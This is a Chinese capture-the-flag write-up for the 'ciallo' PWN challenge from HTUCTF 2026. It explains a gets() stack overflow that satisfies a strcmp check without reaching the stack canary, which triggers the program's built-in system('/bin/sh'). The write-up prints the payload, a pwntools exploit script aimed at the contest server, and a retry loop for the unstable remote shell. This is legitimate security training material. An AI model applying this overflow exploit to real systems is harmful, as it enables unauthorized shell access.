# Ciallo～(∠・ω< )⌒★（ciallo）— PWN 1000pt

- 赛方：HTUCTF 2026
- 地址：`103.163.47.230:32853`
- 附件：`ciallo`
- 脚本：`exp_ciallo.py`

## 题目

> 朝武小姐似乎对接待生人的事情还有一些陌生，你可以教教她该怎么打招呼吗？
> 教会她打招呼了，说不定有好事情呢~

## 附件分析

ELF64 PIE，Ubuntu GCC 13.3 编译，带 canary。整个程序只有两个自定义函数：

```
$ readelf -sW ciallo | grep FUNC | grep -v UND
_start  fangnai  main
```

导入函数也很干净：`puts / gets / system / strcmp / setvbuf / __stack_chk_fail`。

`main` 只做 `setvbuf(..., _IONBF, ...)` 三连 + 一段剧情 `puts`，然后 `return fangnai()`：

```asm
main:
    setvbuf(stdout, NULL, 2, 0)
    setvbuf(stdin,  0, 2, 0)
    setvbuf(stderr, 0, 2, 0)
    puts "朝武芳乃因为太久没有跟生人相处，导致不会打招呼，你能告诉她应该如何打招呼吗？"
    mov  eax, 0
    call fangnai
```

## 漏洞点

```c
void fangnai(void)
{
    char buf[0x60];
    // 先 memset(buf, 0, 0x58)，再 buf[0x40] = "zako"
    gets(buf);                                  // ← 无长度限制
    if (!strcmp(buf + 0x40, "ciallo"))          // .rodata 0x2008
    {
        puts("不错，你找到了答案，去玩千恋万花吧");
        system("/bin/sh");                      // .rodata 0x2044
    }
    else
        puts("芳乃气呼呼的走了，你好像失败了");
}
```

`buf` 在 `rbp-0x60`，而 `buf+0x40` 正好是 `rbp-0x20`；canary 在 `rbp-0x8`。

也就是说：**填满 0x40 字节的 buffer，再补上 `ciallo`，距离 canary 还差 0x18 字节，canary 根本不会被覆盖。**

```
buf         = rbp-0x60
buf + 0x40  = rbp-0x20   ← "ciallo" 放这里，strcmp 通过
canary      = rbp-0x8    ← 没碰到，__stack_chk_fail 不会触发
```

所以这题**不需要泄露 canary、不需要泄露 PIE 基址、不需要 ROP**——程序自己已经把 `system("/bin/sh")` 准备好了，只要会用「ciallo」打招呼就行。

## Payload

```python
payload = b"A" * 0x40 + b"ciallo"
```

## 利用

```python
from pwn import *

context.log_level = "error"
r = remote("103.163.47.230", 32853)
r.recvuntil(b"\xef\xbc\x9f")     # banner 结尾的中文问号
r.sendline(b"A" * 0x40 + b"ciallo")
print(r.recvrepeat(1))           # "不错，你找到了答案，去玩千恋万花吧" + shell
r.interactive()
```

拿到 shell 后按题面提示：

```sh
cat flag            # 可能没输出
cat ciallo          # 先把题目文件输出一遍
cat flag            # 再 cat 就有 flag 了
```

## 踩坑：远程容器的竞态

这是本题唯一真正卡人的地方。`system("/bin/sh")` 之后，远程容器里的 shell **经常立刻死掉**，现象非常有迷惑性：

- 连接空闲时不会收到 FIN，看起来「还活着」；
- 但只要 `send` 一条命令，立刻收到 `ECONNRESET`（RST）。

实测成功率只有约 **2/12**。

解决办法就是**循环重连 + 探活**：每次连接先发 payload，收到「不错」后再发 `echo PING`，有回显才认为 shell 活着，否则立刻重连。完整脚本见 `exp_ciallo.py`：

```bash
python3 exp_ciallo.py      # 自动重试直到拿到活 shell，然后 interactive
```

## 总结

- `gets()` + 精心设计的 `strcmp(buf+0x40, ...)`：漏洞本体是 stack buffer overflow，但**溢出长度刚好够不到 canary**，出题人把 canary 变成了「无效防御」，真正考点是读懂布局、别去无谓地打 canary/ROP。
- 远程侧的不稳定性（shell 秒退）是容器实现问题，不是利用方式问题，重试即可。
